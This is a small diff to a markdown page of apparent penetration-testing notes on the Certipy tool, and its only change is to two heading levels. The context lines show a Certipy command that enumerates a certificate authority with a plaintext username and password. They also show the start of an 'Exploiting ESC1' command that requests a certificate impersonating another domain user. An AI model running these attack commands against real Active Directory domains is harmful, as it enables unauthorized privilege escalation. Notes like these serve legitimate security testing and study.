@@ -57,7 +57,7 @@ options:
 
 For more examples please check the [Github Repo](https://github.com/ly4k/Certipy).
 
-#### Finding CA
+### Finding CA
 
 ```plain
 $ certipy find -u crypt0rr@offsec.nl -p Welkom1234 -dc-ip 10.10.10.10
@@ -75,7 +75,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '202210114803_Certipy.json'
 ```
 
-#### Exploiting ESC1
+### Exploiting ESC1
 
 ```plain
 $ certipy req -u 'crypt0rr.offsec.nl' -p 'Welkom1234' -target 'dc01.offsec.nl' -ca 'CA01-OFFSEC' -template 'ESC1' -upn 'john-da@offsec.nl'
